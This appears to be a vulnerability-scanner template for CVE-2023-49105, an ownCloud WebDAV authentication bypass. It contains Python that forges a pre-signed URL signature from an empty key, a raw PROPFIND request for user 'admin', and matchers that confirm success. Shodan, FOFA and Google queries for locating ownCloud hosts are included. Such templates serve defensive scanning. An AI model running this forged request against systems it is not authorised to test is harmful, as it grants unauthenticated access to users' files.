code:
- engine:
  - py
  - python3
  source: "# build signature for presigned urls\nimport base64, hashlib, datetime,\
    \ os\nfrom urllib.parse import urlencode\n\nusername = os.getenv('username')\n\
    base_url = os.getenv('BaseURL')\ndav_url = f'{base_url}/remote.php/dav/files/{username}'\n\
    oc_date = datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')\ndata = {\n \
    \ 'OC-Expires': '991200',\n  'OC-Verb': 'PROPFIND',\n  'OC-Credential': username,\n\
    \  'OC-Date': oc_date\n}\nsig_url = f'{dav_url}?{urlencode(data)}'\n# derive signature\
    \ from empty sign key\ndk = hashlib.pbkdf2_hmac('sha512', sig_url.encode(), b'',\
    \ 10000, dklen=32)\nfinal_url = f'/remote.php/dav/files/{username}?{urlencode(data)}&OC-Signature={dk.hex()}'\n\
    #final_url = f'{sig_url}&OC-Signature={dk.hex()}'\nprint(final_url)\n"
http:
- extractors:
  - dsl:
    - '"Username => "+ username'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - status_code == 207
    - contains(body, 'owncloud.org')
    name: bypass-correct-user
    type: dsl
  - condition: and
    name: bypass-wrong-user
    part: body
    type: word
    words:
    - User unknown
    - Sabre
    - Exception
    - NotAuthenticated
  matchers-condition: or
  raw:
  - 'PROPFIND {{code_response}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: text/xml

    Authorization: Basic {{base64(''{{username}}'')}}

    '
id: CVE-2023-49105
info:
  author: ChristianPoeschl,FlorianDewald,usdAG
  classification:
    cpe: cpe:2.3:a:owncloud:owncloud:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-49105
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.99519
    epss-score: 0.89272
  description: 'An issue was discovered in ownCloud owncloud/core before 10.13.1.
    An attacker can access, modify, or delete any file without authentication if the
    username of a victim is known, and the victim has no signing-key configured. This
    occurs because pre-signed URLs can be accepted even when no signing-key is configured
    for the owner of the files. The earliest affected version is 10.6.0.

    '
  impact: 'Attackers can access, modify, or delete any files without authentication,
    leading to data breach and integrity issues.

    '
  metadata:
    fofa-query: title="owncloud"
    google-query: intitle:"owncloud"
    max-request: 2
    product: owncloud
    shodan-query:
    - title:"owncloud"
    - http.title:"owncloud"
    vendor: owncloud
  name: OwnCloud - WebDAV API Authentication Bypass
  reference:
  - https://owncloud.com/security-advisories/webdav-api-authentication-bypass-using-pre-signed-urls/
  - https://github.com/0xfed/ownedcloud
  - https://owncloud.org/security
  - https://github.com/ambionics/owncloud-exploits
  - https://github.com/nomi-sec/PoC-in-GitHub
  remediation: 'Upgrade OwnCloud to version 10.13.1 or later that properly validates
    signing keys and authentication in the WebDAV API.

    '
  severity: critical
  tags: cve,cve2023,code,owncloud,auth-bypass,vuln
variables:
  username: admin
